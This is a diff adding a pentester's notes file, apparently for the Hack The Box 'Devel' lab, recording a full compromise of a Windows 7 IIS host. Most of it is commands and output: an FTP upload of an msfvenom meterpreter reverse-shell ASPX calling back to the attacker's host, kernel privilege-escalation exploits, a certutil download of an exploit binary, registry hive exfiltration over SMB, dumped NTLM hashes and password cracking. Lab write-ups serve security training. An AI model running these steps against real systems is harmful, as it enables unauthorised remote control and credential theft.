@@ -1,0 +1,526 @@
+2024-01-13 04:01:12 CST -- START TIME
+###		Devel	###	
+--------------------------------------
+
+|================================================================
+- Name: devel 
+- IP Address: 10.129.36.62
+- OS: Windows 7 (6.1 Build 7600)/x86
+- Notes:
+# https://www.youtube.com/watch?v=2LNyAbroZUk 
+
+//CREDS:
+
+//Flags:
+#User:		84d07e39104d465b68c472690ca7badc
+#System:	4b65160ba76feb53aa9e3ca3c6761c93
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+ping -c1 10.129.174.3
+PING 10.129.174.3 (10.129.174.3) 56(84) bytes of data.
+64 bytes from 10.129.174.3: icmp_seq=1 ttl=127 time=69.0 ms
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.129.174.3
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//21,80
+
+2024-01-13 05:31:14 CST -- 
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       <DIR>          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)
+OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// 21/tcp open  ftp     Microsoft ftpd
+// ftp-anon: Anonymous FTP login allowed (FTP code 230)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+ftp -A 10.129.41.172
+Name (10.129.174.3:kali): anonymous
+Password: <anonymous>
+
+ftp> ls
+200 EPRT command successful.
+150 Opening ASCII mode data connection.
+03-18-17  01:06AM       <DIR>          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+
+
+echo 'CanYaSeeeMe?' > test.txt
+put test.txt
+
+http://10.129.41.172/test.txt
+//Success
+
+2024-01-17 16:44:21 CST -- BREAK
+//NEW LHOST: 10.10.16.42
+//NEW RHOST: 10.129.41.172
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// MSF (IppSec Method)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Create a 32bit ReVShell
+msfvenom -p msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=6969 -f aspx -o msf_rev.aspx
+
+//Upload to target
+ftp> put msf_rev.aspx
+
+//Start MSF
+sudo msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 6969
+
+exploit -jz
+
+//Get CB
+curl http://10.129.41.172/msf_rev.aspx
+
+
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information              Connection
+  --  ----  ----                     -----------              ----------
+  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.16.42:6969 -> 10.129.4
+                                                              1.172:49162 (10.129.41.172)
+
+2024-01-17 18:21:51 CST -- 
+sessions -i 1
+
+//SUCCESS
+
+meterpreter > sysinfo
+Computer        : DEVEL
+OS              : Windows 7 (6.1 Build 7600).
+Architecture    : x86
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+meterpreter > getuid
+Server username: IIS APPPOOL\Web
+
+meterpreter > shell
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          18/1/2024, 12:12:58 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     3.071 MB
+Available Physical Memory: 2.434 MB
+Virtual Memory: Max Size:  6.141 MB
+Virtual Memory: Available: 5.519 MB
+Virtual Memory: In Use:    622 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Local Area Connection 4
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.129.0.1
+                                 IP address(es)
+                                 [01]: 10.129.41.172
+                                 [02]: fe80::ad1b:3d91:a9a4:5556
+                                 [03]: dead:beef::cc88:6ca6:1305:6c4f
+                                 [04]: dead:beef::ad1b:3d91:a9a4:5556
+
+// PrivEsc
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Background meterpreter session (CTL+Z)
+
+msf6 exploit(multi/handler) > search suggest
+
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+//NOTE: Trying IppSec method
+# https://www.youtube.com/watch?v=2LNyAbroZUk
+
+
+//Trying ms10_015_kitrap0d
+// Description: This module will create a new session with SYSTEM privileges via the KiTrap0D exploit by Tavis Ormandy. If the session in use is already elevated then the exploit will not run. The module relies on kitrap0d.x86.dll,and is not supported on x64 editions of Windows.
+
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 1
+setg LHOST tun0
+setg LPORT 443
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+//SUCCESS!!!
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+meterpreter > ls 'C:\users'
+Listing: C:\users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  8192  dir   2017-03-17 18:16:53 -0500  Administrator
+040777/rwxrwxrwx  0     dir   2009-07-13 23:53:55 -0500  All Users
+040777/rwxrwxrwx  8192  dir   2017-03-17 18:06:26 -0500  Classic .NET AppPool
+040555/r-xr-xr-x  8192  dir   2009-07-14 02:14:28 -0500  Default
+040777/rwxrwxrwx  0     dir   2009-07-13 23:53:55 -0500  Default User
+040555/r-xr-xr-x  4096  dir   2009-07-14 02:20:18 -0500  Public
+040777/rwxrwxrwx  8192  dir   2017-03-17 09:17:52 -0500  babis
+100666/rw-rw-rw-  174   fil   2009-07-13 23:41:57 -0500  desktop.ini
+
+//Get User
+meterpreter > ls 'C:\Users\babis\Desktop'
+Listing: C:\Users\babis\Desktop
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-03-17 09:17:51 -0500  desktop.ini
+100444/r--r--r--  34    fil   2024-01-17 19:11:55 -0600  user.txt
+
+meterpreter > cat 'C:\Users\babis\Desktop\user.txt'
+//84d07e39104d465b68c472690ca7badc
+
+//Get Admin/root
+meterpreter > ls 'C:\Users\Administrator\Desktop'
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-03-17 18:16:53 -0500  desktop.ini
+100444/r--r--r--  34    fil   2024-01-17 19:11:55 -0600  root.txt
+
+
+meterpreter > cat 'C:\Users\Administrator\Desktop\root.txt'
+//4b65160ba76feb53aa9e3ca3c6761c93
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// EXTRA (GetCreds)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+-- impacket-smbserver --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sudo impacket-smbserver -smb2support PUBLIC .
+
+  # On victim
+net view \\10.10.16.42
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// impacket-secretsdump --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+reg save hklm\sam \\10.10.16.42\Public\sam.hiv
+reg save hklm\security \\10.10.16.42\Public\security.hiv
+reg save hklm\system \\10.10.16.42\Public\system.hiv
+
+2024-01-17 20:20:24 CST -- 
+impacket-secretsdump -sam ./sam.hiv -security ./security.hiv -system ./system.hiv LOCAL -outputfile hashdump.txt
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+2024-01-17 20:33:39 CST -- 
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashdump.txt.sam
+
+                 (Guest)
+ 
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+============================================================
+
+
+// EC-Council Method
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+msfvenom -p msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=443 -f aspx -o msf_rev_x86.aspx
+
+//Upload to target
+ftp> put msf_rev_x86.aspx
+
+//Start MSF
+sudo msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 443
+
+exploit -jz
+
+//Get CB
+curl http://10.129.36.62/msf_rev_x86.aspx
+
+//SUCCESS
+
+meterpreter > sysinfo
+Computer        : DEVEL
+OS              : Windows 7 (6.1 Build 7600).
+Architecture    : x86
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+---
+
+//Background meterpreter session (CTL+Z)
+
+search suggester
+
+//FOUND: local_exploit_suggester
+
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
+ 3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
+ 9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+ 14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+ 15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+
+// USING: ms10_015_kitrap0d
+
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 1
+setg LHOST tun0
+setg LPORT 443
+
+run
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+//SUCCESS
+
+
+// Alternate (Rotten-Potato) 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+//SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+
+meterpreter > getuid
+Server username: IIS APPPOOL\Web
+
+meterpreter > load incognito
+
+meterpreter > list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+IIS APPPOOL\Web
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+//SeImpersonatePrivilege
+
+
+// ms16_075_reflection
+// rotten-potato
+use exploit/windows/local/ms16_075_reflection
+set SESSION 1
+
+run
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+// Manual Privilege Escalation
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
+
+//Download
+cp ~/Downloads/MS10-059.exe .
+
+//Start MSF
+sudo msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 443
+
+meterpreter > cd 'C:\WINDOWS\temp'
+meterpreter > pwd
+C:\windows\temp
+
+meterpreter > upload MS10-059.exe
+
+//OR 
+sudo python -m http.server 80
+certutil -urlcache -f http://10.10.16.42/MS10-059.exe ms10.exe
+
+ms10.exe
+/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
+
+//StartListener
+sudo rlwrap -cAr nc -lvnp 443
+
+//CB
+ms10.exe 10.10.16.42 443
+
+whoami
+nt authority\system
+
+//SUCCESS!!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2024-01-18 02:45:57 CST -- COMPLETE
+
